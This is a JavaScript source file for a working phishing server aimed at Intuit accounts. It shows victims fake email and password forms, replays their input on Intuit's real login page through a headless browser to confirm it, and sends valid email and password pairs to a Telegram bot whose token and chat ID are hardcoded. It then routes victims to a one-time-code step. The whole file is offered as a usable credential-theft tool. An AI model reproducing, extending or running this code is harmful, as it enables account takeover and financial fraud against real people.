const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer");
const fs = require("fs");
const path = require("path");
const axios = require("axios"); // Import Axios for HTTP requests
const FormData = require("form-data"); // Import the correct FormData package


const app = express();
const PORT = 3000;

// Middleware for parsing form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static HTML files
app.use(express.static(path.join(__dirname, "public")));

// Store session data
let sessionData = {};

// Custom delay function
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


app.get("/error", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "error.html"));
});

// Route for displaying the email input form
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "email.html"));
});

// Handle email submission
app.post("/submit-email", async (req, res) => {
  sessionData.email = req.body.email;

  // Launch Puppeteer to verify email
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  try {
    await page.goto("https://accounts.intuit.com/", { waitUntil: "load" });

    // Type email
    console.log(`Typing email: ${sessionData.email}`);
    await page.type('input[name="Email"]', sessionData.email);

    // Click the "Sign in" button
    console.log("Clicking the 'Sign in' button...");
    await page.click('[data-testid="IdentifierFirstSubmitButton"]');

    // Wait for the page to react
    console.log("Waiting for the page to load...");
    await delay(7000); // Custom delay

    // Check if the invalid email error message is present
    const emailError = await page.$('[data-testid="IdentifierFirstErrorMessage"]');
    if (emailError) {
      console.log("Invalid email detected.");
      sessionData.error = "Invalid email. Please try again.";
      await browser.close();
      return res.redirect("/email-error");
    }

    // If no error, proceed to password page
    console.log("Email is valid. Proceeding to password step...");
    sessionData.page = page; // Save Puppeteer page for further steps
    return res.redirect("/password");
  } catch (error) {
    console.error("Error during email verification:", error.message);
  
    // Optionally store the error in session data (if needed)
    sessionData.error = error.message;
  
    // Close the Puppeteer browser
    await browser.close();
  
    // Redirect to the error page with the error message as a query parameter
    res.redirect(`/emailerror`);
  }
});

// Serve the emailerror.html file
app.get("/emailerror", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "emailerror.html"));
});

app.get("/email-error", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "emailerror.html"));
});


// Route to handle the password page
app.get("/password", (req, res) => {
  const email = sessionData.email || ""; // Use the email stored in sessionData
  sessionData.email = email; // Save the email for later use
  res.redirect(`/password.html?email=${encodeURIComponent(email)}`);
});

// Handle password submission
app.post("/submit-password", async (req, res) => {
  const password = req.body.password;
  const page = sessionData.page;

  try {
    // Clear the password input field and type the password
    console.log(`Clearing and typing password...`);

    // Focus on the password input field
    await page.click('input[name="Password"]');

    // Select all text in the password field (Ctrl+A or Command+A depending on the OS)
    await page.keyboard.down('Control'); // Use 'Meta' for macOS
    await page.keyboard.press('KeyA');  // Select all text
    await page.keyboard.up('Control');  // Release the key

    // Delete the selected text
    await page.keyboard.press('Backspace');

    // Type the new password
    await page.type('input[name="Password"]', password);

    // Click the "Continue" button
    console.log("Clicking the 'Continue' button...");
    await page.click('[data-testid="passwordVerificationContinueButton"]');

    // Wait for potential error message or OTP prompt
    console.log("Checking for error or OTP prompt...");
    await delay(3000); // Custom delay

    // Check if the invalid password error message is present
    const passwordError = await page.$('[id="iux-password-confirmation-password-error"]');
    if (passwordError) {
      console.log("Invalid password detected.");
      sessionData.error = "Invalid password. Please try again.";
      return res.redirect("/password-error");
    }

    // If no error, send email and password to Telegram
    console.log("Password is valid. Sending email and password to Telegram...");
    await sendToTelegram(sessionData.email, password);

    // Proceed to OTP verification
    console.log("Password is valid. Proceeding to OTP verification...");
    return res.redirect("/verify");
  } catch (error) {
    console.error("Error during password verification:", error.message);

    // Store the error message in session data
    sessionData.error = error.message;

    // Redirect to the emailerror.html page with the error message as a query parameter
    res.redirect(`/emailerror?error=${encodeURIComponent(error.message)}`);
  }
});

// Function to send email and password to Telegram
async function sendToTelegram(email, password) {
  const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram Bot API token
  const chatId = "2127941790"; // Replace with your Telegram chat ID
  const message = `{INTUIT} EMAIL: ${email} Password: ${password}`;

  try {
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;
    await axios.post(url, {
      chat_id: chatId,
      text: message,
    });
    console.log("Message sent to Telegram successfully.");
  } catch (error) {
    console.error("Error sending message to Telegram:", error.message);
  }
}


